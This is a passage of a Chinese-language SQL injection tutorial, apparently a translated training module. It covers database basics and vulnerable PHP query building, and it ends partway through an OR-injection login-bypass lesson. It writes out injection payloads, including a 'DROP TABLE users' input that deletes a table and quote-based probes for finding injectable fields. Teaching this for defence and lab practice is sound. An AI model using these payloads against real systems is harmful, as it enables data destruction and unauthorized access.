href=\"#0x01-介绍\" class=\"headerlink\" title=\"0x01 介绍\"></a>0x01 介绍</h2><p>大多数现代 Web 应用程序在后端使用数据库结构。此类数据库用于存储和检索与 Web 应用程序相关的数据，从实际 Web 内容到用户信息和内容等。为了使 Web 应用程序动态化，Web 应用程序必须与数据库实时交互。当来自用户的 HTTP(S) 请求到达时，Web 应用程序的后端将向数据库发出查询以构建响应。这些查询可以包括来自 HTTP(S) 请求的信息或其他相关信息。</p>\n<p><img src=\"https://p.ipic.vip/oxdmae.png\" alt=\"数据库管理系统架构\"></p>\n<p>当用户提供的信息用于构造对数据库的查询时，恶意用户可以诱使查询用于原始程序员预期之外的其他用途，从而使用称为 SQL 注入的攻击为用户提供查询数据库的权限（ SQLi).</p>\n<p>SQL 注入是指针对关系数据库的攻击，例如<code>MySQL</code>（而非关系数据库的注入，例如 MongoDB，是 NoSQL 注入）。本模块将重点<code>MySQL</code>介绍 SQL 注入概念。</p>\n<hr>\n<h3 id=\"SQL-注入-SQLi\"><a href=\"#SQL-注入-SQLi\" class=\"headerlink\" title=\"SQL 注入 (SQLi)\"></a>SQL 注入 (SQLi)</h3><p>Web 应用程序中可能存在许多类型的注入漏洞，例如 HTTP 注入、代码注入和命令注入。然而，最常见的例子是 SQL 注入。当恶意用户试图传递更改 Web 应用程序发送到数据库的最终 SQL 查询的输入时，就会发生 SQL 注入，从而使用户能够直接对数据库执行其他意外的 SQL 查询。</p>\n<p>有很多方法可以做到这一点。要使 SQL 注入发挥作用，攻击者必须首先注入 SQL 代码，然后通过更改原始查询或执行全新的查询来颠覆 Web 应用程序逻辑。首先，攻击者必须在预期的用户输入限制之外注入代码，因此它不会作为简单的用户输入来执行。在最基本的情况下，这是通过注入单引号 ( <code>&#39;</code>) 或双引号 ( <code>&quot;</code>) 来避开用户输入的限制并将数据直接注入 SQL 查询来完成的。</p>\n<p>一旦攻击者可以注入，他们就必须寻找一种方法来执行不同的 SQL 查询。这可以通过使用 SQL 代码来组成一个工作查询来完成，该查询可以同时执行预期的 SQL 查询和新的 SQL 查询。有很多方法可以实现这一点，例如使用<a href=\"https://www.sqlinjection.net/stacked-queries/\">堆叠</a>查询或使用<a href=\"https://www.mysqltutorial.org/sql-union-mysql.aspx/\">联合</a>查询。最后，要检索新查询的输出，我们必须在 Web 应用程序的前端对其进行解释或捕获。</p>\n<hr>\n<h3 id=\"用例和影响\"><a href=\"#用例和影响\" class=\"headerlink\" title=\"用例和影响\"></a>用例和影响</h3><p>SQL 注入可能会产生巨大的影响，尤其是在后端服务器和数据库的权限非常松懈的情况下。</p>\n<p>首先，我们可能会检索我们不应该看到的秘密&#x2F;敏感信息，例如用户登录名和密码或信用卡信息，然后可以将其用于其他恶意目的。SQL 注入导致许多网站密码和数据泄露，这些网站随后被重新用于窃取用户帐户、访问其他服务或执行其他恶意操作。</p>\n<p>SQL 注入的另一个用例是破坏预期的 Web 应用程序逻辑。最常见的示例是在不传递有效的用户名和密码凭据对的情况下绕过登录。另一个例子是访问锁定给特定用户的功能，比如管理面板。攻击者还可以直接在后台服务器上读写文件，进而在后台服务器上设置后门，直接控制后台服务器，最终控制整个后台服务器。网站。</p>\n<hr>\n<h3 id=\"预防\"><a href=\"#预防\" class=\"headerlink\" title=\"预防\"></a>预防</h3><p>SQL 注入通常是由编码不当的 Web 应用程序或不安全的后端服务器和数据库权限引起的。稍后，我们将讨论通过安全编码方法（例如用户输入清理和验证以及适当的后端用户权限和控制）来减少易受 SQL 注入攻击的机会的方法。</p>\n<h2 id=\"0x02-数据库简介\"><a href=\"#0x02-数据库简介\" class=\"headerlink\" title=\"0x02 数据库简介\"></a>0x02 数据库简介</h2><p>在我们了解 SQL 注入之前，我们需要更多地了解数据库和结构化查询语言 (SQL)，哪些数据库将执行必要的查询。网络应用程序利用后端数据库来存储与网络应用程序相关的各种内容和信息。这可以是核心 Web 应用程序资产，如图像和文件、内容（如帖子和更新）或用户数据（如用户名和密码）。</p>\n<p>有许多不同类型的数据库，每一种都适合特定的用途。传统上，应用程序使用基于文件的数据库，随着大小的增加，速度非常慢。<code>Database Management Systems</code>这导致了( )的采用<code>DBMS</code>。</p>\n<hr>\n<h3 id=\"数据库管理系统\"><a href=\"#数据库管理系统\" class=\"headerlink\" title=\"数据库管理系统\"></a>数据库管理系统</h3><p>数据库管理系统 (DBMS) 有助于创建、定义、托管和管理数据库。随着时间的推移，设计了各种 DBMS，例如基于文件、关系 DBMS (RDBMS)、NoSQL、基于图形和键&#x2F;值存储。</p>\n<p>有多种方式可以与 DBMS 交互，例如命令行工具、图形界面，甚至 API（应用程序编程接口）。DBMS 用于各种银行、金融和教育部门以记录大量数据。DBMS 的一些基本特征包括：</p>\n<table>\n<thead>\n<tr>\n<th><strong>特征</strong></th>\n<th><strong>描述</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>Concurrency</code></td>\n<td>一个真实世界的应用程序可能有多个用户同时与之交互。DBMS 确保这些并发交互成功而不会损坏或丢失任何数据。</td>\n</tr>\n<tr>\n<td><code>Consistency</code></td>\n<td>对于如此多的并发交互，DBMS 需要确保数据在整个数据库中保持一致和有效。</td>\n</tr>\n<tr>\n<td><code>Security</code></td>\n<td>DBMS 通过用户身份验证和权限提供细粒度的安全控制。这将防止未经授权查看或编辑敏感数据。</td>\n</tr>\n<tr>\n<td><code>Reliability</code></td>\n<td>备份数据库并在数据丢失或破坏的情况下将它们回滚到以前的状态很容易。</td>\n</tr>\n<tr>\n<td><code>Structured Query Language</code></td>\n<td>SQL 通过支持各种操作的直观语法简化了用户与数据库的交互。</td>\n</tr>\n</tbody></table>\n<hr>\n<h3 id=\"架构\"><a href=\"#架构\" class=\"headerlink\" title=\"架构\"></a>架构</h3><p>下图详细说明了一个两层架构。</p>\n<p><img src=\"https://p.ipic.vip/jadjj1.png\" alt=\"数据库管理系统架构\"></p>\n<p><code>Tier I</code>通常由客户端应用程序组成，例如网站或 GUI 程序。这些应用程序由高级交互组成，例如用户登录或评论。<code>Tier II</code>来自这些交互的数据通过 API 调用或其他请求传递。</p>\n<p>第二层是中间件，它解释这些事件并将它们放入 DBMS 所需的格式中。最后，应用层根据 DBMS 的类型使用特定的库和驱动程序与它们进行交互。DBMS 从第二层接收查询并执行请求的操作。这些操作可能包括数据的插入、检索、删除或更新。处理后，DBMS 返回任何请求的数据或错误代码以应对无效查询。</p>\n<p>可以在同一台主机上托管应用程序服务器和 DBMS。但是，具有支持许多用户的大量数据的数据库通常单独托管以提高性能和可伸缩性。</p>\n<h2 id=\"0x03-数据库类型\"><a href=\"#0x03-数据库类型\" class=\"headerlink\" title=\"0x03 数据库类型\"></a>0x03 数据库类型</h2><p>一般来说，数据库分为<code>Relational Databases</code>和<code>Non-Relational Databases</code>。只有关系数据库使用 SQL，而非关系数据库使用多种通信方法。</p>\n<hr>\n<h3 id=\"关系数据库\"><a href=\"#关系数据库\" class=\"headerlink\" title=\"关系数据库\"></a>关系数据库</h3><p>关系数据库是最常见的数据库类型。它使用模式、模板来指示存储在数据库中的数据结构。例如，我们可以想象一家向其客户销售产品的公司拥有关于这些产品的去向、销售对象和数量的某种形式的存储知识。然而，这通常是在后端完成的，而在前端没有明显的通知。每种方法都可以使用不同类型的关系数据库。例如，第一个表可以存储和显示基本的客户信息，第二个表可以存储销售的产品数量及其成本，第三个表可以列举谁购买了这些产品以及支付数据。</p>\n<p>关系数据库中的表与提供快速数据库摘要或在需要查看特定数据时访问特定行或列的键相关联。这些表，也称为实体，都相互关联。例如，客户信息表可以为每个客户提供一个特定的 ID，该 ID 可以指示我们需要了解的有关该客户的所有信息，例如地址、姓名和联系信息。此外，产品描述表可以为每个产品分配一个特定的 ID。存储所有订单的表只需要记录这些 ID 及其数量。这些表格中的任何更改都会影响所有这些表格，但可以预见和系统地影响。</p>\n<p><code>relational database management system</code>但是，在处理集成数据库时，需要一个概念，即使用称为( )的键将一个表链接到另一个表<code>RDBMS</code>。许多最初使用不同概念的公司正在转向 RDBMS 概念，因为这个概念易于学习、使用和理解。最初，这个概念只被大公司使用。然而，许多类型的数据库现在都实现了 RDBMS 概念，例如 Microsoft Access、MySQL、SQL Server、Oracle、PostgreSQL 等等。</p>\n<p>例如，我们可以<code>users</code>在关系数据库中有一个表，其中包含<code>id</code>、<code>username</code>、<code>first_name</code>、<code>last_name</code>和其他列。可以<code>id</code>用作表键。另一个表<code>posts</code>可能包含所有用户发布的帖子，列有<code>id</code>、<code>user_id</code>、<code>date</code>、<code>content</code>等。</p>\n<p><img src=\"https://p.ipic.vip/ko5y8y.jpg\" alt=\"HTML范例\"></p>\n<p>我们可以将表中的<code>id</code>from链接<code>users</code>到<code>user_id</code>表中<code>posts</code>以检索每个帖子的用户详细信息，而无需存储每个帖子的所有用户详细信息。一个表可以有多个键，因为另一列可以用作键来链接另一个表。因此，例如，该<code>id</code>列可以用作将<code>posts</code>表链接到另一个包含评论的表的键，每个评论都属于一个特定的帖子，等等。</p>\n<p>数据库中表之间的关系称为模式。</p>\n<p>这样，通过使用关系数据库，可以快速轻松地从所有数据库中检索有关特定元素的所有数据。因此，例如，我们可以使用单个查询从所有表中检索链接到特定用户的所有详细信息。这使得关系数据库对于具有清晰结构和设计以及高效数据管理的大数据集非常快速和可靠。关系数据库最常见的示例是<code>MySQL</code>，我们将在本模块中介绍。</p>\n<hr>\n<h3 id=\"非关系数据库\"><a href=\"#非关系数据库\" class=\"headerlink\" title=\"非关系数据库\"></a>非关系数据库</h3><p>非关系数据库（也称为<code>NoSQL</code>数据库）不使用表、行和列或主键、关系或模式。相反，NoSQL 数据库根据存储的数据类型使用各种存储模型来存储数据。由于没有为数据库定义的结构，NoSQL 数据库具有很强的可扩展性和灵活性。因此，在处理定义和结构不是很好的数据集时，NoSQL 数据库将是存储此类数据的最佳选择。NoSQL 数据库有四种常见的存储模型：</p>\n<ul>\n<li>核心价值</li>\n<li>基于文档</li>\n<li>宽栏</li>\n<li>图形</li>\n</ul>\n<p>上述每个模型都有不同的数据存储方式。例如，该<code>Key-Value</code>模型通常以 JSON 或 XML 格式存储数据，每一对都有一个键，并将其所有数据存储为它的值： <img src=\"https://p.ipic.vip/m6b9rg.jpg\" alt=\"HTML范例\"></p>\n<p>上面的示例可以使用 JSON 表示为：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;100001&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;date&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;01-01-2021&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;content&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Welcome to this web application.&quot;</span></span><br><span class=\"line\">  <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;100002&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;date&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;02-01-2021&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;content&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;This is the first post on this web app.&quot;</span></span><br><span class=\"line\">  <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;100003&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;date&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;02-01-2021&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;content&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Reminder: Tomorrow is the ...&quot;</span></span><br><span class=\"line\">  <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>它看起来类似于<code>Python</code>or <code>PHP</code>（即<code>&#123;&#39;key&#39;:&#39;value&#39;&#125;</code>）等语言中的字典项，其中 the<code>key</code>通常是字符串，而 the<code>value</code>可以是字符串、字典或任何类对象。</p>\n<p>NoSQL 数据库最常见的示例是<code>MongoDB</code>.</p>\n<h2 id=\"0x04-SQL-注入简介\"><a href=\"#0x04-SQL-注入简介\" class=\"headerlink\" title=\"0x04 SQL 注入简介\"></a>0x04 SQL 注入简介</h2><h3 id=\"在-Web-应用程序中使用-SQL\"><a href=\"#在-Web-应用程序中使用-SQL\" class=\"headerlink\" title=\"在 Web 应用程序中使用 SQL\"></a>在 Web 应用程序中使用 SQL</h3><p>首先，让我们看看 Web 应用程序如何使用 MySQL 数据库来存储和检索数据。一旦在后端服务器上安装并设置了 DBMS 并启动并运行，Web 应用程序就可以开始利用它来存储和检索数据。</p>\n<p>例如，在<code>PHP</code>Web 应用程序中，我们可以连接到我们的数据库，并<code>MySQL</code>通过<code>MySQL</code>语法开始使用数据库，就在 中<code>PHP</code>，如下所示：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$conn</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">mysqli</span>(<span class=\"string\">&quot;localhost&quot;</span>, <span class=\"string\">&quot;root&quot;</span>, <span class=\"string\">&quot;password&quot;</span>, <span class=\"string\">&quot;users&quot;</span>);</span><br><span class=\"line\"><span class=\"variable\">$query</span> = <span class=\"string\">&quot;select * from logins&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$result</span> = <span class=\"variable\">$conn</span>-&gt;<span class=\"title function_ invoke__\">query</span>(<span class=\"variable\">$query</span>);</span><br></pre></td></tr></table></figure>\n\n<p>然后，查询的输出将存储在 中<code>$result</code>，我们可以将其打印到页面或以任何其他方式使用它。下面的 PHP 代码将在新行中打印 SQL 查询的所有返回结果：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span>(<span class=\"variable\">$row</span> = <span class=\"variable\">$result</span>-&gt;<span class=\"title function_ invoke__\">fetch_assoc</span>() )&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"variable\">$row</span>[<span class=\"string\">&quot;name&quot;</span>].<span class=\"string\">&quot;&lt;br&gt;&quot;</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Web 应用程序在检索数据时通常也使用用户输入。例如，当用户使用搜索功能搜索其他用户时，他们的搜索输入将传递给 Web 应用程序，该应用程序使用输入在数据库中进行搜索：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$searchInput</span> =  <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;findUser&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$query</span> = <span class=\"string\">&quot;select * from logins where username like &#x27;%<span class=\"subst\">$searchInput</span>&#x27;&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$result</span> = <span class=\"variable\">$conn</span>-&gt;<span class=\"title function_ invoke__\">query</span>(<span class=\"variable\">$query</span>);</span><br><span class=\"line\">If we <span class=\"keyword\">use</span> <span class=\"title\">user</span>-<span class=\"title\">input</span> <span class=\"title\">within</span> <span class=\"title\">an</span> <span class=\"title\">SQL</span> <span class=\"title\">query</span>, <span class=\"title\">and</span> <span class=\"title\">if</span> <span class=\"title\">not</span> <span class=\"title\">securely</span> <span class=\"title\">coded</span>, <span class=\"title\">it</span> <span class=\"title\">may</span> <span class=\"title\">cause</span> <span class=\"title\">a</span> <span class=\"title\">variety</span> <span class=\"title\">of</span> <span class=\"title\">issues</span>, <span class=\"title\">like</span> <span class=\"title\">SQL</span> <span class=\"title\">Injection</span> <span class=\"title\">vulnerabilities</span>.</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h3 id=\"什么是注射？\"><a href=\"#什么是注射？\" class=\"headerlink\" title=\"什么是注射？\"></a>什么是注射？</h3><p>在上面的示例中，我们接受用户输入并将其直接传递给 SQL 查询而不进行清理。</p>\n<p>清理是指删除用户输入中的任何特殊字符，以中断任何注入尝试。</p>\n<p>当应用程序将用户输入错误解释为实际代码而不是字符串时，就会发生注入，从而更改代码流并执行它。这可以通过注入特殊字符（如 ( <code>&#39;</code>)）来转义用户输入边界，然后编写要执行的代码（如 JavaScript 代码或 SQL 注入中的 SQL）来实现。除非对用户输入进行清理，否则很可能会执行注入的代码并运行它。</p>\n<hr>\n<h3 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h3><p>当用户输入被输入到 SQL 查询字符串中而没有正确清理或过滤输入时，就会发生 SQL 注入。前面的示例展示了如何在 SQL 查询中使用用户输入，并且它没有使用任何形式的输入清理：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$searchInput</span> =  <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;findUser&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$query</span> = <span class=\"string\">&quot;select * from logins where username like &#x27;%<span class=\"subst\">$searchInput</span>&#x27;&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$result</span> = <span class=\"variable\">$conn</span>-&gt;<span class=\"title function_ invoke__\">query</span>(<span class=\"variable\">$query</span>);</span><br></pre></td></tr></table></figure>\n\n<p>在典型情况下，<code>searchInput</code>将输入 以完成查询，返回预期结果。我们键入的任何输入都会进入以下 SQL 查询：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> logins <span class=\"keyword\">where</span> username <span class=\"keyword\">like</span> <span class=\"string\">&#x27;%$searchInput&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>所以，如果我们输入<code>admin</code>，它变成<code>&#39;%admin&#39;</code>。在这种情况下，如果我们编写任何 SQL 代码，它只会被视为搜索词。例如，如果我们输入<code>SHOW DATABASES;</code>，它将被执行为<code>&#39;%SHOW DATABASES;&#39;</code>Web 应用程序将搜索类似于 的用户名<code>SHOW DATABASES;</code>。但是，由于没有清理，在这种情况下，<strong>我们可以添加一个单引号 ( <code>&#39;</code>)，它将结束用户输入字段，然后我们可以编写实际的 SQL 代码</strong>。例如，如果我们搜索<code>1&#39;; DROP TABLE users;</code>，搜索输入将是：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27;%1&#x27;</span>; DROP TABLE users;<span class=\"string\">&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>请注意我们如何在“1”之后添加单引号 (‘)，以避开用户输入 (‘%$searchInput’) 的范围。</p>\n<p>因此，最终执行的 SQL 查询如下：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> logins <span class=\"keyword\">where</span> username <span class=\"keyword\">like</span> <span class=\"string\">&#x27;%1&#x27;</span>; <span class=\"keyword\">DROP</span> <span class=\"keyword\">TABLE</span> users;<span class=\"string\">&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>正如我们从语法突出显示中看到的那样，我们可以转义原始查询的边界并执行新注入的查询。<code>Once the query is run, the </code>用户<code> table will get deleted.</code></p>\n<p>注意：在上面的示例中，为了简单起见，我们在分号（;）之后添加了另一个 SQL 查询。虽然这对于 MySQL 实际上是不可能的，但对于 MSSQL 和 PostgreSQL 是可能的。在接下来的部分中，我们将讨论在 MySQL 中注入 SQL 查询的真正方法。</p>\n<hr>\n<h3 id=\"语法错误\"><a href=\"#语法错误\" class=\"headerlink\" title=\"语法错误\"></a>语法错误</h3><p>前面的 SQL 注入示例将返回错误：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Error</span>: near line <span class=\"number\">1</span>: near <span class=\"string\">&quot;&#x27;&quot;</span>: syntax error</span><br></pre></td></tr></table></figure>\n\n<p>这是因为最后一个尾随字符，我们有一个<code>&#39;</code>没有关闭的额外引号 ()，这会导致执行时出现 SQL 语法错误：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> logins <span class=\"keyword\">where</span> username <span class=\"keyword\">like</span> <span class=\"string\">&#x27;%1&#x27;</span>; <span class=\"keyword\">DROP</span> <span class=\"keyword\">TABLE</span> users;<span class=\"string\">&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>在这种情况下，我们只有一个尾随字符，因为我们的搜索查询输入接近 SQL 查询的末尾。然而，用户输入通常在 SQL 查询的中间，原始 SQL 查询的其余部分在它之后。</p>\n<p>要成功注入，我们必须确保新修改的 SQL 查询在注入后仍然有效并且没有任何语法错误。在大多数情况下，我们无法访问源代码来查找原始 SQL 查询并开发适当的 SQL 注入来进行有效的 SQL 查询。那么，我们如何才能成功地注入到 SQL 查询中呢？</p>\n<p>一个答案是使用<code>comments</code>，我们将在后面的部分讨论这个问题。另一种方法是通过传入多个单引号使查询语法起作用，我们将在接下来讨论 ( <code>&#39;</code>)。</p>\n<p>现在我们了解了 SQL 注入的基础知识，让我们开始学习一些实际用途。</p>\n<hr>\n<h3 id=\"SQL注入的类型\"><a href=\"#SQL注入的类型\" class=\"headerlink\" title=\"SQL注入的类型\"></a>SQL注入的类型</h3><p>SQL 注入根据我们检索其输出的方式和位置进行分类。</p>\n<p><img src=\"https://p.ipic.vip/p4s9ku.jpg\" alt=\"数据库管理系统架构\"></p>\n<p>在简单的情况下，预期和新查询的输出可能会直接打印在前端，我们可以直接读取。这称为<code>In-band</code>SQL 注入，它有两种类型：<code>Union Based</code>和<code>Error Based</code>。</p>\n<p>使用<code>Union Based</code>SQL 注入，我们可能必须指定我们可以读取的确切位置，即“列”，以便查询将输出定向到那里打印。至于SQL 注入，当我们可以在前端<code>Error Based</code>获取<code>PHP</code>或错误时使用它，因此我们可能会故意导致返回查询输出的 SQL 错误。<code>SQL</code></p>\n<p>在更复杂的情况下，我们可能无法打印输出，因此我们可以利用 SQL 逻辑逐个字符地检索输出。这称为<code>Blind</code>SQL 注入，它也有两种类型：<code>Boolean Based</code>和<code>Time Based</code>。</p>\n<p>通过<code>Boolean Based</code>SQL 注入，我们可以使用 SQL 条件语句来控制页面是否返回任何输出，“即原始查询响应”，如果我们的条件语句返回<code>true</code>。对于<code>Time Based</code>SQL 注入，我们使用 SQL 条件语句，如果条件语句<code>true</code>使用<code>Sleep()</code>函数返回，则延迟页面响应。</p>\n<p>最后，在某些情况下，我们可能无法直接访问输出，因此我们可能必须将输出定向到远程位置，“即 DNS 记录”，然后尝试从那里检索它。这称为<code>Out-of-band</code>SQL 注入。</p>\n<p>在本模块中，我们将只专注于通过学习 SQL 注入来介绍<code>Union Based</code>SQL 注入。</p>\n<h2 id=\"0x05-颠覆查询逻辑\"><a href=\"#0x05-颠覆查询逻辑\" class=\"headerlink\" title=\"0x05 颠覆查询逻辑\"></a>0x05 颠覆查询逻辑</h2><hr>\n<p>现在我们对 SQL 语句的工作原理有了基本的了解，让我们开始 SQL 注入。在我们开始执行整个 SQL 查询之前，我们将首先学习通过注入运算符<code>OR</code>和使用 SQL 注释来颠覆原始查询逻辑来修改原始查询。这方面的一个基本示例是绕过 Web 身份验证，我们将在本节中对此进行演示。</p>\n<hr>\n<h3 id=\"身份验证绕过\"><a href=\"#身份验证绕过\" class=\"headerlink\" title=\"身份验证绕过\"></a>身份验证绕过</h3><p>考虑以下管理员登录页面。</p>\n<p><img src=\"https://p.ipic.vip/v1wx7o.png\" alt=\"管理面板\"></p>\n<p>我们可以使用管理员凭据登录<code>admin / p@ssw0rd</code>。</p>\n<p><img src=\"https://p.ipic.vip/rr2k1g.png\" alt=\"admin_creds\"></p>\n<p>该页面还显示了正在执行的 SQL 查询，以便更好地了解我们将如何颠覆查询逻辑。我们的目标是在不使用现有密码的情况下以管理员用户身份登录。正如我们所见，当前正在执行的 SQL 查询是：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">FROM</span> logins <span class=\"keyword\">WHERE</span> username<span class=\"operator\">=</span><span class=\"string\">&#x27;admin&#x27;</span> <span class=\"keyword\">AND</span> password <span class=\"operator\">=</span> <span class=\"string\">&#x27;p@ssw0rd&#x27;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>该页面接收凭据，然后使用<code>AND</code>运算符选择与给定用户名和密码匹配的记录。如果<code>MySQL</code>数据库返回匹配的记录，则凭据有效，因此代码<code>PHP</code>会将登录尝试条件评估为<code>true</code>。如果条件评估为<code>true</code>，则返回管理员记录，并验证我们的登录。让我们看看当我们输入错误的凭据时会发生什么。</p>\n<p><img src=\"https://p.ipic.vip/wiuu1q.png\" alt=\"管理员不正确\"></p>\n<p>不出所料，由于密码错误导致<code>false</code>操作结果导致登录失败<code>AND</code>。</p>\n<hr>\n<h3 id=\"SQLi-发现\"><a href=\"#SQLi-发现\" class=\"headerlink\" title=\"SQLi 发现\"></a>SQLi 发现</h3><p>在我们开始破坏 Web 应用程序的逻辑并试图绕过身份验证之前，我们首先必须测试登录表单是否容易受到 SQL 注入的攻击。为此，我们将尝试在我们的用户名后添加以下有效负载之一，看看它是否会导致任何错误或改变页面的行为方式：</p>\n<table>\n<thead>\n<tr>\n<th>有效载荷</th>\n<th>网址编码</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>&#39;</code></td>\n<td><code>%27</code></td>\n</tr>\n<tr>\n<td><code>&quot;</code></td>\n<td><code>%22</code></td>\n</tr>\n<tr>\n<td><code>#</code></td>\n<td><code>%23</code></td>\n</tr>\n<tr>\n<td><code>;</code></td>\n<td><code>%3B</code></td>\n</tr>\n<tr>\n<td><code>)</code></td>\n<td><code>%29</code></td>\n</tr>\n</tbody></table>\n<p>注意：在某些情况下，我们可能必须使用负载的 URL 编码版本。这方面的一个例子是当我们将我们的有效负载直接放在 URL“即 HTTP GET 请求”中时。</p>\n<p>因此，让我们从注入单引号开始：</p>\n<p><img src=\"https://p.ipic.vip/j8ps1w.png\" alt=\"报价错误\"></p>\n<p>我们看到抛出了 SQL 错误而不是<code>Login Failed</code>消息。该页面引发错误，因为生成的查询是：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">FROM</span> logins <span class=\"keyword\">WHERE</span> username<span class=\"operator\">=</span><span class=\"string\">&#x27;&#x27;&#x27; AND password = &#x27;</span>something<span class=\"string\">&#x27;;</span></span><br></pre></td></tr></table></figure>\n\n<p>如上一节所述，我们输入的引号导致了奇数个引号，从而导致语法错误。一种选择是注释掉查询的其余部分，并将查询的其余部分作为我们注入的一部分来编写，以形成一个有效的查询。另一种选择是在我们注入的查询中使用偶数个引号，这样最终的查询仍然有效。</p>\n<hr>\n<h3 id=\"或注射\"><a href=\"#或注射\" class=\"headerlink\" title=\"或注射\"></a>或注射</h3><p><code>true</code>无论输入的用户名和密码如何，我们都需要查询始终返回，以绕过身份验证。为此，我们可以<code>OR</code>在 SQL 注入中滥用运算符。</p>\n<p>如前所述，<a href=\"https://dev.mysql.com/doc/refman/8.0/en/operator-precedence.html\">操作优先级的</a>MySQL 文档指出<code>AND</code>操作符将在操作符之前被评估<code>OR</code>。<code>TRUE</code>这意味着如果整个查询中至少有一个条件和一个<code>OR</code>运算符，则整个查询的计算结果将是 to <code>TRUE</code>，因为如果其操作数之一是 ，<code>OR</code>则运算符返回。<code>TRUE``TRUE</code></p>\n<p>始终返回的条件示例<code>true</code>是<code>&#39;1&#39;=&#39;1&#39;</code>。但是，为了保持 SQL 查询正常工作并保持偶数个引号，而不是使用 (‘1’&#x3D;’1’)，我们将删除最后一个引号并使用 